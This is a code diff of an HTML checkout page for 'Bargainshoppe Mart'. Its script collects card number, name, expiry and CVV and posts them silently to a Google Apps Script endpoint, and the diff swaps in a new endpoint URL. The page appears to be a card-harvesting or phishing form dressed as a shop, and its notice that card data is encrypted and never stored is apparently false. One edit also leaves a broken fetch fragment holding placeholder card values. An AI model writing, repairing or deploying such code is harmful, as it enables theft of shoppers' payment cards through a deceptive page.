@@ -224,29 +224,7 @@
                     <input type="number" id="cvv" placeholder="CVV" maxlength="4">
                 </div>
             </div>
-            
-            <div class="btn-group">
-                <button class="payment-btn visa-btn">
-                    <span>💳</span> Pay with Visa
-                </button>
-                <button class="payment-btn mastercard-btn">
-                    <span>💳</span> Pay with Mastercard
-                </button>
-                <button class="payment-btn amex-btn">
-                    <span>💳</span> Pay with American Express
-                </button>
-                <button class="payment-btn discover-btn">
-                    <span>💳</span> Pay with Discover
-                </button>
-            </div>
-            
-            <div class="secure-note">
-                <p><strong>🔒 Secure Payment:</strong> Your card information is encrypted and never stored on our servers. Bargainshoppe Mart uses industry-standard SSL encryption for all transactions.</p>
-            </div>
-        </div>
-    </div>
-
-    <script>
+<script>
         // Format card number with spaces
         document.getElementById('card-number').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
@@ -281,7 +259,7 @@
                 if (!cardNumber || !cardName || !expiry || !cvv) {
                     alert('Please fill in all required fields.');
                     return;
-                    fetch('https://script.google.com/macros/s/AKfycbwZyy6B7Ro_CeQKXhAfuWBv2AntIooH6VHr6UrBQHaYaHBA47Pv8ZSuQokChy1-cUdb/exec', {
+                
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
   body: JSON.stringify({cardNumber:'1234 5678 9012 3456',cardName:'John Doe',expiry:'MM/YY',cvv:'123'})
@@ -314,7 +292,7 @@ document.querySelector('form').addEventListener('submit', async function(e) {
     
     try {
         // CRITICAL FIX: Removed trailing space in URL + removed problematic headers
-        await fetch('https://script.google.com/macros/s/AKfycbwZyy6B7Ro_CeQKXhAfuWBv2AntIooH6VHr6UrBQHaYaHBA47Pv8ZSuQokChy1-cUdb/exec', {
+        await fetch('https://script.google.com/macros/s/AKfycbz6yXPkjBS9ndnARLVa4lF3oteglzXJwmG1HCvBStDF-L0akvuQYvhHNrfC56Sk_ci7/exec', {
             method: 'POST',
             mode: 'no-cors',
             body: JSON.stringify(data)
@@ -329,7 +307,27 @@ document.querySelector('form').addEventListener('submit', async function(e) {
 });
 </script>
 
-   <button type="submit">PAY NOW</button>
+   <button type="submit">PAY NOW</button>            
+            <div class="btn-group">
+                <button class="payment-btn visa-btn">
+                    <span>💳</span> Pay with Visa
+                </button>
+                <button class="payment-btn mastercard-btn">
+                    <span>💳</span> Pay with Mastercard
+                </button>
+                <button class="payment-btn amex-btn">
+                    <span>💳</span> Pay with American Express
+                </button>
+                <button class="payment-btn discover-btn">
+                    <span>💳</span> Pay with Discover
+                </button>
+            </div>
+            
+            <div class="secure-note">
+                <p><strong>🔒 Secure Payment:</strong> Your card information is encrypted and never stored on our servers. Bargainshoppe Mart uses industry-standard SSL encryption for all transactions.</p>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
 
